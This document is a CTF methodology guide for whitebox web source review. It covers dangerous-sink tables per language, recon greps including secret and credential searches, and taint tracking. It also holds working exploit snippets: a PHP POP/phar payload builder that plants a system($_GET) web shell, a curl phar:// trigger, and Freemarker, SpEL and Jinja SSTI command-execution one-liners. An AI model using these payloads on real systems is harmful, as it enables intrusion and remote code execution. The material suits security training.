# CTF Web - Whitebox Source-Code Review Methodology

Systematic source-to-sink review for whitebox web challenges (CWEE-style): map entry points, grep dangerous sinks per language, taint-track user input to a sink, then build the chain. For the individual vuln classes this feeds into, see [server-side.md](server-side.md), [server-side-deser.md](server-side-deser.md), [server-side-exec.md](server-side-exec.md), [sql-injection.md](sql-injection.md), [node-and-prototype.md](node-and-prototype.md), and [race-conditions.md](race-conditions.md).

## Table of Contents
- [Review Order of Operations](#review-order-of-operations)
- [Fast Recon Greps](#fast-recon-greps)
- [Map Entry Points and Routes](#map-entry-points-and-routes)
- [Dangerous Sinks - PHP](#dangerous-sinks---php)
- [Dangerous Sinks - Python](#dangerous-sinks---python)
- [Dangerous Sinks - Node.js / JavaScript](#dangerous-sinks---nodejs--javascript)
- [Dangerous Sinks - Java](#dangerous-sinks---java)
- [Dangerous Sinks - Ruby](#dangerous-sinks---ruby)
- [Taint Tracking: Source to Sink](#taint-tracking-source-to-sink)
- [PHP POP Chain Construction from Source](#php-pop-chain-construction-from-source)
- [Decompiled-Source Gadget Hunting (JAR / .NET)](#decompiled-source-gadget-hunting-jar--net)
- [Config, Secret, and Dependency Hunting](#config-secret-and-dependency-hunting)
- [Diffing and Version Pinning](#diffing-and-version-pinning)
- [Worked Example: Source to Chain](#worked-example-source-to-chain)

---

## Review Order of Operations

Do not read files top-to-bottom. Work sink-first and boundary-first:

1. **Fingerprint the stack.** Language, framework, template engine, ORM, session mechanism, dependency versions (lockfiles). This decides which sink table applies.
2. **Enumerate entry points.** Every route/controller, every place that reads `GET/POST/headers/cookies/path/body/uploaded files`. These are your taint *sources*.
3. **Grep the sink tables below.** Each hit is a candidate. Note file:line.
4. **Connect source to sink.** For each sink, walk backwards: is any argument attacker-controlled and insufficiently sanitized on that path?
5. **Read the guard.** The bug is usually in the *validation*, not the sink — off-by-one, wrong operator (`==` vs `===`), regex not anchored, blocklist not allowlist, check-then-use gap.
6. **Build the chain.** A single sink rarely gives the flag directly; identify the primitive (file read / write / SSRF / SQLi / RCE) and what it unlocks next.

Keep a running `notes.md`: `source -> transform -> sink @ file:line -> primitive -> next step`.

---

## Fast Recon Greps

```bash
SRC=./challenge-source

# Identify stack
find "$SRC" -maxdepth 3 \( -name composer.json -o -name package.json -o -name requirements.txt \
  -o -name pom.xml -o -name build.gradle -o -name Gemfile -o -name go.mod \) -print

# All user-input sources at once (adjust per language)
grep -RniE '\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)|request\.(args|form|json|values|cookies|headers|data)|req\.(query|body|params|headers|cookies)|getParameter|params\[' "$SRC"

# Secrets / config
grep -RniE 'secret|api[_-]?key|password|passwd|token|private[_-]?key|APP_KEY|SECRET_KEY' "$SRC" \
  --include='*.php' --include='*.py' --include='*.js' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.ini'

# Custom crypto / auth (frequent CTF bug source)
grep -RniE 'hmac|sign|verify|md5|sha1|hashlib|createHash|random|rand\(|srand|mt_rand|uniqid' "$SRC"

# Deserialization + dynamic exec across languages (see sink tables)
grep -RniE 'unserialize|pickle|yaml\.load|Marshal|readObject|ObjectInputStream|eval|exec|system|popen|child_process|Runtime\.getRuntime' "$SRC"
```

Always run `git log --all --oneline` and `git stash list` if a `.git` dir shipped — commented-out debug routes and leaked secrets hide in history (see [auth-infra.md](auth-infra.md) Git History Credential Leakage).

---

## Map Entry Points and Routes

- **PHP:** router file / `index.php` front controller, `$_SERVER['PATH_INFO']`, framework route files (`routes/web.php`, Symfony `config/routes.yaml`, annotations `#[Route(...)]`).
- **Flask/Django:** `@app.route`, `urls.py`, DRF `ViewSet`. Note `methods=`, missing `@login_required`, and `render_template_string` (SSTI).
- **Express:** `app.get/post`, `router.use` middleware order (bypass by route-ordering / `%2f`, see [auth-and-access.md](auth-and-access.md)). Check `app.use` auth applied *before* the target route.
- **Spring:** `@GetMapping/@PostMapping/@RequestMapping`, `@RequestParam`, `@PathVariable`, `WebSecurityConfigurerAdapter` / `SecurityFilterChain` allow-lists.

For each route record: auth required? role checked? which parameters flow where? A route missing an ownership check is IDOR/broken-access (see [auth-and-access-2.md](auth-and-access-2.md)).

---

## Dangerous Sinks - PHP

```
RCE:            eval, assert, create_function, `backticks`, system, exec, shell_exec,
                passthru, popen, proc_open, preg_replace(/e), call_user_func[_array],
                array_map(user_fn), ${$var}(), $fn($arg)
File read/incl:  include[_once], require[_once], file_get_contents, fopen, readfile,
                fread, file, highlight_file, show_source, parse_ini_file, SplFileObject
File write:     file_put_contents, fwrite, fputs, move_uploaded_file, copy, rename
SQL:            mysqli_query, ->query, PDO::query, PDO::exec (unparameterized concat)
Deserialize:    unserialize, yaml_parse, phar:// (any file op triggers metadata unserialize)
SSRF/net:       curl_exec, file_get_contents(http), fsockopen, get_headers
Type-juggle:    ==, !=, in_array($x,$a) (loose), switch, strcmp/loose compare (see server-side.md)
```

Wrapper primitives to look for once you have partial file control: `php://filter` (source leak / convert-encode write), `data://`, `zip://`, `phar://` (see [server-side.md](server-side.md) and [server-side-exec.md](server-side-exec.md)). Any `include($_GET[...])` with no scheme filter = LFI→RCE via log poisoning / session file / wrapper.

Magic methods (POP-chain material): `__wakeup`, `__destruct`, `__toString`, `__call`, `__get/__set`, `__invoke`. See [PHP POP Chain Construction](#php-pop-chain-construction-from-source).

---

## Dangerous Sinks - Python

```
RCE:            eval, exec, compile, os.system, os.popen, subprocess.* (shell=True),
                pty.spawn, __import__, pickle.loads, yaml.load (no SafeLoader),
                marshal.loads, dill.loads
Template SSTI:  render_template_string, Template(...).render, jinja2.Environment,
                flask.render_template_string, Mako Template, string.Template.substitute
File:           open(user), os.path.join(root,user), send_file, send_from_directory,
                shutil.*, pathlib.Path(user)
SQL:            cursor.execute(f"...{x}..."), .raw(), extra(), string-formatted queries
Deserialize:    pickle/cPickle.loads, yaml.load, jsonpickle.decode, __reduce__
SSRF:           requests.get(user), urllib.request.urlopen, httpx, aiohttp
Format-string:  "{}".format(user_obj) / f-string with attribute access (str.format traversal)
```

`yaml.load(x)` without `Loader=SafeLoader` = RCE via `!!python/object/apply:os.system`. `pickle.loads` on any user-reachable bytes = RCE (see [server-side-deser.md](server-side-deser.md)). `subprocess.run(cmd, shell=True)` with concatenation = command injection; without `shell=True` but with a user-controlled *argument* still allows argument injection (e.g. `-o`, `--`).

---

## Dangerous Sinks - Node.js / JavaScript

```
RCE:            eval, Function(...), vm.runInNewContext/runInThisContext (escapable),
                child_process.exec/execSync (shell), child_process.spawn(user),
                require(user), process.binding
Proto pollution: obj[key1][key2]=val, Object.assign(target,userJson), lodash.merge/set,
                 recursive extend/defaultsDeep, JSON body -> deep merge (__proto__, constructor)
Template SSTI:  ejs.render(user options), pug/handlebars with helpers, res.render(user)
SQL/NoSQL:      db.query(concat), $where, mongo find(userObject) (operator injection)
Path:           fs.readFile/writeFile(user), path.join(root,user), res.sendFile
Deserialize:    node-serialize.unserialize (IIFE _$$ND_FUNC$$_), funcster, serialize-javascript
```

Prototype pollution is the flagship Node whitebox chain: find a recursive merge/set sink reached by JSON body, then find a *gadget* (a later code path that reads an attacker-pollutable property with an unsafe default) to reach RCE/SSTI/auth-bypass. Full chains in [node-and-prototype.md](node-and-prototype.md).

---

## Dangerous Sinks - Java

```
RCE:            Runtime.getRuntime().exec, ProcessBuilder, ScriptEngine.eval (Nashorn/JS),
                Groovy Eval/GroovyShell, SpEL SpelExpressionParser.parseExpression,
                MVEL/OGNL evaluation, reflection Method.invoke on user class/method
Deserialize:    ObjectInputStream.readObject, XMLDecoder.readObject, XStream.fromXML,
                Kryo, SnakeYAML yaml.load, Jackson enableDefaultTyping / @JsonTypeInfo,
                fastjson JSON.parseObject(autotype), Castor xsi:type
Template SSTI:  Freemarker (?api / new()), Velocity, Thymeleaf (SpEL), Pebble
XXE:            DocumentBuilderFactory / SAXParser / XMLReader without disabling DTDs
SQL:            Statement.execute(concat), createQuery(HQL concat), @Query with concat
Path/EL:        Apache ErrorDocument expr, JNDI lookup (log4j-style), Context.lookup(user)
```

Freemarker sandbox escape (unless `?api`/`new` disabled): `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`. Velocity: `#set($e=$engine.class... )` reflection to `Runtime`. SpEL: `T(java.lang.Runtime).getRuntime().exec(...)`. Deserialization gadget generation via `ysoserial` — see [server-side-deser.md](server-side-deser.md).

---

## Dangerous Sinks - Ruby

```
RCE:            eval, instance_eval, class_eval, send/__send__(user), Kernel#open("|cmd"),
                system, exec, %x[], `backticks`, Marshal.load, YAML.load (Psych <safe),
                ERB.new(user).result, constantize/const_get (Rails)
SQL:            where("... #{x}"), find_by_sql, sanitize_sql skipped, order(user)
Deserialize:    Marshal.load, YAML.load (Ruby object gadgets), Oj.load(mode: :object)
SSRF/file:      open(user), IO.read(user), Net::HTTP(user), send_file
Mass-assign:    Model.new(params), update(params) without strong params (permit)
```

`Kernel#open("|whoami")` — a leading pipe turns `open` into command exec (also `IO.read`, `IO.foreach`). `constantize`/`send` with user input = arbitrary method call. See ERB and instance_eval breakouts in [server-side-exec.md](server-side-exec.md).

---

## Taint Tracking: Source to Sink

For each sink hit, walk backwards and answer: *does an attacker-controlled value reach this argument, and what happens to it on the way?*

```
SOURCE  (GET/POST/header/cookie/path/upload/db-row-from-earlier-write)
   |  assignments, function params, array/object membership
TRANSFORM (each is a chance to break the guard)
   |  - decode:   urldecode, base64, json_decode, unserialize   -> can reintroduce metachars
   |  - encode:   htmlspecialchars, addslashes, escape          -> check charset/context mismatch
   |  - validate: regex (anchored? multiline?), in_array (loose?), length, extension
   |  - normalize: realpath, path canonicalization, unicode NFKC -> order vs validation matters
SINK    (from tables above)
```

Common guard defects to flag:
- **Blocklist not allowlist** — enumerate what it forgot (`.phtml`, `.phar`, `System`, alternate case, unicode homoglyphs).
- **Validate-then-transform** — check runs on the *pre-decoded* value; sink sees the decoded one (double-encoding, `%2f`, unicode normalization). See [server-side-advanced.md](server-side-advanced.md).
- **Regex not anchored** (`/admin/` vs `/^admin$/`) or missing `\A...\z` in Ruby (multiline `$` matches newline).
- **Loose comparison** (`==`, `in_array` w/o strict) — type juggling (see [server-side.md](server-side.md)).
- **Second-order** — value stored safely, read back and used unsafely elsewhere (see [sql-injection.md](sql-injection.md) Second-Order). Track values into the DB and back out.
- **TOCTOU** — the check and the use are separated (see [race-conditions.md](race-conditions.md)).

---

## PHP POP Chain Construction from Source

When you find `unserialize($userdata)` (cookie, POST, or via `phar://`), build a Property-Oriented Programming chain from the classes actually in the codebase.

1. **List magic methods** — the automatic entry points:
```bash
grep -RniE 'function\s+__(wakeup|destruct|toString|call|get|set|invoke|isset)\b' "$SRC" --include='*.php'
```
2. **Pick a trigger.** `__destruct`/`__wakeup` fire automatically on unserialize. `__toString` fires when the object is used in string context; `__call` on missing-method calls.
3. **Follow the gadget.** Inside the magic method, look for a call on a *property* you control: `$this->handler->close()`, `$this->obj->{$this->method}()`, `file_put_contents($this->path,$this->data)`, `eval($this->code)`, `call_user_func($this->cb)`. Each property you control lets you pivot to another class's method.
4. **Chain classes** until a property-controlled call reaches a dangerous sink (write, include, exec, or another `__call`).

```php
// Minimal serialized-payload builder — set properties to match the target classes
class Logger { public $file; public $data; }   // __destruct: file_put_contents($this->file,$this->data)
$o = new Logger();
$o->file = "shell.php";
$o->data = "<?php system(\$_GET['c']); ?>";
echo urlencode(serialize($o));
// If __wakeup exists and sanitizes, exploit __destruct via property-count mismatch (PHP <7.x)
// or use a class whose __destruct is reachable without __wakeup interference.
```
### Property visibility changes the serialized bytes

The builder above only works when every gadget property is `public`. Non-public properties are
name-mangled by `serialize()`, and hand-writing the payload without the mangling produces an object
whose properties are silently unset — the chain then does nothing and looks like a wrong gadget.

| Visibility | Serialized key | Length counts the NUL bytes |
|---|---|---|
| `public $file` | `s:4:"file"` | 4 |
| `protected $file` | `s:7:"\0*\0file"` | 7 |
| `private $file` in class `Logger` | `s:12:"\0Logger\0file"` | 12 |

```php
// protected: O:6:"Logger":1:{s:7:"\0*\0file";s:9:"shell.php";}
// private:   O:6:"Logger":1:{s:12:"\0Logger\0file";s:9:"shell.php";}
```

Mirror the target's declarations exactly when you redeclare the class locally — copy the modifiers
from the source rather than making everything public, and let PHP's own `serialize()` emit the
mangling for you. If you must hand-write it, remember the `\0` are real bytes and the `s:` length
includes them; a length that is off by two is the usual symptom. Private properties are mangled with
the **declaring** class name, so a property inherited from a parent carries the parent's name, not
the child's.

### Gadget sources beyond the application's own code

Step 3 above searches the application. Real targets rarely have a usable chain in their own classes —
the gadget almost always comes from a dependency, which is why a `/vendor` directory or a
`composer.lock` is the finding that matters.

```bash
# Magic methods across dependencies, which is where the chain actually lives
grep -RniE 'function\s+__(destruct|wakeup|toString|call|invoke)\b' "$SRC/vendor" --include='*.php' | head -50
cat "$SRC/composer.lock" | grep -E '"name"|"version"' | paste - -   # pin versions, then check for known chains
```

Priority order once you know the dependency set: **Monolog** (`__destruct` through a handler into
`call_user_func`), **Guzzle** (`FnStream`/`__destruct` reaching a callable), **Laravel/Symfony**
container and cache classes, **Doctrine**, and any framework logging or cache class that writes a
property to a path. PHPGGC is the reference catalogue of published chains and is worth checking
against the pinned versions before hand-building anything — if a known chain covers the version in
`composer.lock`, use it and spend the time elsewhere.

Where no dependency chain exists, widen to the language runtime itself: `SplFileObject`,
`ArrayObject`, and the SOAP and DOM classes have all provided primitives, and a `__toString` on any
in-scope class is reachable from anywhere the object hits string context.

### Building a phar payload

Passing an attacker-uploaded `.phar` to a file op (`file_exists`, `fopen`, `getimagesize`,
`include`, `file_get_contents`) unserializes its metadata — no explicit `unserialize()` call is
needed. That is what joins an unrestricted upload handler to a deserialization sink, and it is the
usual shape of a whitebox chain.

Building one has three requirements that each silently break it if missed:

- **`phar.readonly` must be off** to write an archive. It is on by default, so pass
  `-d phar.readonly=0` on the CLI — this affects only your build machine, not the target.
- **The stub must end with `__HALT_COMPILER();`**, and PHP requires that exact token. The archive is
  still parsed as a phar regardless of the file extension, so name it `.png`, `.jpg`, or whatever the
  upload filter accepts.
- **The metadata is the payload.** `setMetadata()` takes a live object, so build the gadget instance
  and hand it over; PHP serialises it for you, which also gets the visibility mangling right.

```php
<?php  // php -d phar.readonly=0 build.php
class Logger { public $file = '/var/www/html/s.php'; public $data = '<?php system($_GET["c"]); ?>'; }
$p = new Phar('payload.phar');
$p->startBuffering();
$p->addFromString('a.txt', 'pad');          // an archive needs at least one entry
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');   // GIF magic first if the upload sniffs content
$p->setMetadata(new Logger());
$p->stopBuffering();
rename('payload.phar', 'payload.png');
```

Trigger it with the `phar://` wrapper against wherever the file landed:

```bash
curl "http://$TARGET/view.php?f=phar:///var/www/uploads/payload.png"
```

Two things to verify before assuming the technique failed. `phar://` metadata deserialization was
removed in **PHP 8.0**, so confirm the target's major version first — on PHP 8 this chain is closed
and the sink must be reached another way. And if the upload path is unknown, the archive still works
through any traversal or LFI primitive that reaches it, since the wrapper only needs a readable path.

---

## Decompiled-Source Gadget Hunting (JAR / .NET)

CWEE whitebox modules ship *compiled* Java/.NET (JARs, `.dll`/`.exe`, WARs) with no source. Decompile to near-original source and run the same source→sink review on it — the deserialization/injection sink is the "source" of the gadget hunt and a reachable `exec`/reflection is the "sink".

**Decompile:**
```bash
# --- Java ---
# unpack first (JAR/WAR are zips): unzip app.jar -d app/ ; classes under WEB-INF/classes + lib/*.jar
procyon -jar app.jar -o ./src        # Procyon — best control-flow/generics reconstruction
cfr app.jar --outputdir ./src        # CFR — fast, great with lambdas/switch/string-concat
jd-gui app.jar                       # jd-gui — GUI browsing, quick triage
# (also: Fernflower/IntelliJ built-in, Bytecode-Viewer to compare multiple decompilers)

# --- .NET ---
ilspycmd app.dll -p -o ./src         # ILSpy CLI — batch "export to project"
# dnSpy / dnSpyEx — GUI decompiler + DEBUGGER (breakpoints, edit-and-continue, live var inspection)
# dotPeek (JetBrains). If obfuscated (ConfuserEx etc.): run de4dot app.dll first.
```

**Hunt the sink, then walk back to a reachable source:**
```bash
# Java sinks / gadget material
grep -RniE 'readObject|readResolve|readExternal|implements Serializable|ObjectInputStream' ./src
grep -RniE 'Runtime|ProcessBuilder|Method\.invoke|ScriptEngine|TemplatesImpl|newInstance|InvokerTransformer|ChainedTransformer|SpelExpressionParser|OGNL|Freemarker|GroovyShell' ./src
# .NET sinks
grep -RniE '\.Deserialize\(|BinaryFormatter|LosFormatter|ObjectStateFormatter|NetDataContractSerializer|SoapFormatter|JavaScriptSerializer|TypeNameHandling|Activator\.CreateInstance|Assembly\.Load|Process\.Start' ./src
grep -RniE 'machineKey|validationKey|decryptionKey|EnableViewStateMac' ./src   # keys enabling ViewState forgery
```

**Workflow (identical discipline to source-to-sink above):**
1. **Locate the sink** — a deserialization call (`readObject`, `BinaryFormatter.Deserialize`) or an injection sink (`Runtime.exec`, `Process.Start`, SpEL/OGNL eval, reflective invoke).
2. **Find the reachable source** — trace *backwards* to a route/handler/endpoint that feeds attacker bytes into it (a `@PostMapping` reading the body, an MVC action reading a hidden field/cookie, a message handler). If the sink is a generic `readObject`, the "source" is the transport (cookie/param/upload) carrying the serialized blob.
3. **Build the chain** — assemble the gadget from classes present in the decompiled tree (custom `readObject`, `TiedMapEntry`/`LazyMap`, `TemplatesImpl`, `ObjectDataProvider`); when no stock `ysoserial`/`ysoserial.net` chain fits, hand-build it. Full mechanics in [server-side-deser.md](server-side-deser.md) (".NET Deserialization" and "Building a Java Gadget Chain from Decompiled Source").
4. **Confirm reachability by live-debugging** — this is what separates a plausible chain from a working one:
   - **.NET:** open the assembly in **dnSpy**, breakpoint the `Deserialize`/`Process.Start` sink, send your payload, step out to confirm the attacker path hits it; edit-and-continue to test tweaks without recompiling.
   - **Java:** start the app with `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005`, attach IntelliJ/`jdb`, breakpoint the sink, and walk the call stack back to the HTTP entry point to prove the source→sink path.
5. **Grep for keys/secrets in the same tree** — decompiled `web.config`/`application.properties`/embedded strings often leak the `machineKey`, HMAC secret, or hard-coded creds that turn a "needs-a-key" attack (ViewState MAC, signed cookie) into a one-shot forge.

**Key insight:** Compiled ≠ closed. Decompilation returns readable source, so gadget hunting *is* whitebox review with two extra steps: decompile first, and use the decompiler's debugger (dnSpy) or remote JDWP to *prove* the sink is reachable from an attacker source before investing in the payload. Trace sink→source, not the reverse.

---

## Config, Secret, and Dependency Hunting

- **Framework secrets** enable offline forgery: Flask `SECRET_KEY` (forge/decrypt session → pickle RCE, see [server-side-deser.md](server-side-deser.md) Werkzeug), Rails `secret_key_base` (cookie deserialization), Laravel `APP_KEY` (decrypt/forge, `X-XSRF-TOKEN`), Django `SECRET_KEY`, Express `cookie-session` keys.
- **`.env` / `config.php` / `settings.py` / `application.properties`** — DB creds, JWT secrets, cloud keys. Reachable via LFI/traversal (see [server-side-advanced.md](server-side-advanced.md) Nginx alias).
- **Dependency versions** — read the lockfile, map to known CVEs (`composer.lock`, `package-lock.json`, `requirements.txt` pins, `pom.xml`). A pinned vulnerable version is often the intended path (see [cves.md](cves.md)).
- **Debug flags** — `DEBUG=True` (Flask/Werkzeug console PIN, Django SQL/tracebacks), Symfony `APP_ENV=dev` profiler (see [symfony-local-triage.md](symfony-local-triage.md)).

---

## Diffing and Version Pinning

When the challenge ships a *modified* known application, the injected bug is in the diff:
```bash
# Fetch the pristine upstream at the pinned version, diff against the challenge tree
git clone --depth 1 --branch "$VER" https://upstream/repo pristine
diff -ruN --exclude=.git pristine "$SRC" | less     # every hunk is a suspect
```
For interpreted apps with no VCS, compare file hashes against a pip/composer/npm cache of the same version; any file that differs is attacker-planted or the intended vuln.

---

## Worked Example: Source to Chain

Target: Flask app, whitebox. Goal `/flag` requires `role=admin`.

1. **Sources:** `profile = request.get_json()` in `/api/profile`; `avatar = request.args['f']` in `/avatar`.
2. **Sink grep** finds `send_file(os.path.join(UPLOAD, avatar))` and `render_template_string("Hi %s" % user.name)`.
3. **Taint `/avatar`:** `avatar` reaches `os.path.join` with no traversal guard → arbitrary file read. `os.path.join(UPLOAD, "../app.py")` leaks source; `../instance/config.py` leaks `SECRET_KEY`.
4. **Chain:** With `SECRET_KEY`, forge a session cookie setting `role=admin` (flask-unsign) → hit `/flag`. *Or* the `render_template_string("Hi %s" % user.name)` is SSTI: set `name` to `{{cycler.__init__.__globals__.os.popen('id').read()}}` (see [server-side.md](server-side.md)) for RCE.
5. **Report** the shortest path: file-read → SECRET_KEY → forged admin session → flag. Note the SSTI as an alternate RCE path.

The discipline: every sink is a candidate primitive; the flag is a *path through primitives*, and the review's job is to find the shortest one and the guard that lets you take it.
